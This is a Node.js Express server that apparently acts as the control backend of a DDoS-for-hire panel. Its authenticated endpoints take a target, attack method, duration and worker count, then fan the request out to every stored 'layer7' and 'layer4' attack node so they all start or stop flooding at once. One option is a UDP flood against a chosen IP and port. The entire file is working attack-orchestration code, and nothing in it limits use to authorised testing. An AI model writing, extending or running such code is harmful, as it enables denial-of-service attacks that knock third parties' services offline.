import express from "express";
import { createClient } from "@supabase/supabase-js";

const app = express();
app.use(express.json());

const SUPABASE_URL = "https://fyzbqbubsdkjrmppkdsl.supabase.co";
const SUPABASE_SERVICE_KEY = process.env.VITE_SUPABASE_SERVICE_KEY;

const supabaseAdmin = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY, {
  auth: { autoRefreshToken: false, persistSession: false },
});

// ── Auth middleware — verify Supabase JWT ─────────────────────────────────────
async function requireAuth(req, res, next) {
  const token = req.headers.authorization?.replace("Bearer ", "");
  if (!token) return res.status(401).json({ error: "Unauthorized" });

  const { data: { user }, error } = await supabaseAdmin.auth.getUser(token);
  if (error || !user) return res.status(401).json({ error: "Unauthorized" });

  req.user = user;
  next();
}

// ── Helper: fire a fetch with timeout ────────────────────────────────────────
async function fetchWithTimeout(url, options, ms = 15000) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), ms);
  try {
    return await fetch(url, { ...options, signal: controller.signal });
  } finally {
    clearTimeout(timer);
  }
}

// ── POST /proxy/l7/start ──────────────────────────────────────────────────────
app.post("/proxy/l7/start", requireAuth, async (req, res) => {
  const { target, method, duration, workers, rate_delay } = req.body;

  const { data: apis, error } = await supabaseAdmin.from("layer7_apis").select("url");
  if (error) return res.status(500).json({ error: "Failed to fetch L7 nodes" });
  if (!apis?.length) return res.json({ total: 0, online: 0, results: [] });

  const body = { target, method, duration, workers, verbose: false, rate_delay };

  // Pre-flight stop
  await Promise.allSettled(
    apis.map((api) =>
      fetch(`${api.url}/api/attack/stop`, { method: "POST" }).catch(() => {})
    )
  );
  await new Promise((r) => setTimeout(r, 500));

  // Fire start on all nodes simultaneously
  const settled = await Promise.allSettled(
    apis.map(async (api) => {
      try {
        const r = await fetchWithTimeout(`${api.url}/api/attack/start`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(body),
        });
        if (!r.ok) throw new Error(`HTTP ${r.status} ${r.statusText}`);
        const data = await r.json();
        return { success: true, data };
      } catch (err) {
        return {
          success: false,
          error: err.name === "AbortError" ? "timed out (15 s)" : err.message,
        };
      }
    })
  );

  const results = settled.map((s, i) =>
    s.status === "fulfilled"
      ? s.value
      : { success: false, error: s.reason?.message ?? String(s.reason) }
  );

  const online = results.filter((r) => r.success).length;
  res.json({ total: apis.length, online, results });
});

// ── POST /proxy/l7/stop ───────────────────────────────────────────────────────
app.post("/proxy/l7/stop", requireAuth, async (req, res) => {
  const { data: apis } = await supabaseAdmin.from("layer7_apis").select("url");
  if (apis?.length) {
    await Promise.allSettled(
      apis.map((api) =>
        fetch(`${api.url}/api/attack/stop`, { method: "POST" }).catch(() => {})
      )
    );
  }
  res.json({ ok: true });
});

// ── POST /proxy/l4/start ──────────────────────────────────────────────────────
app.post("/proxy/l4/start", requireAuth, async (req, res) => {
  const { target, port, method, duration } = req.body;

  const { data: apis, error } = await supabaseAdmin.from("layer4_apis").select("url");
  if (error) return res.status(500).json({ error: "Failed to fetch L4 nodes" });
  if (!apis?.length) return res.json({ total: 0, online: 0, results: [] });

  const body =
    method === "UDP-NORMAL"
      ? { method: 1, ip: target, port: parseInt(port, 10), duration }
      : { method: 2, ip: target, time: duration };

  const settled = await Promise.allSettled(
    apis.map(async (api) => {
      try {
        const r = await fetchWithTimeout(`${api.url}/api/hit`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(body),
        });
        if (!r.ok) throw new Error(`HTTP ${r.status} ${r.statusText}`);
        const data = await r.json();
        if (!data?.instance_id) throw new Error(`No instance_id in response`);
        return { success: true, instance_id: data.instance_id };
      } catch (err) {
        return {
          success: false,
          error: err.name === "AbortError" ? "timed out (15 s)" : err.message,
        };
      }
    })
  );

  const results = settled.map((s) =>
    s.status === "fulfilled"
      ? s.value
      : { success: false, error: s.reason?.message ?? String(s.reason) }
  );

  const online = results.filter((r) => r.success).length;
  res.json({ total: apis.length, online, results });
});

// ── POST /proxy/l4/stop ───────────────────────────────────────────────────────
app.post("/proxy/l4/stop", requireAuth, async (req, res) => {
  const { data: apis } = await supabaseAdmin.from("layer4_apis").select("url");
  if (apis?.length) {
    await Promise.allSettled(
      apis.map((api) =>
        fetch(`${api.url}/api/stop/all`, { method: "POST" }).catch(() => {})
      )
    );
  }
  res.json({ ok: true });
});

const PORT = 3001;
app.listen(PORT, () => console.log(`[proxy] Server running on port ${PORT}`));
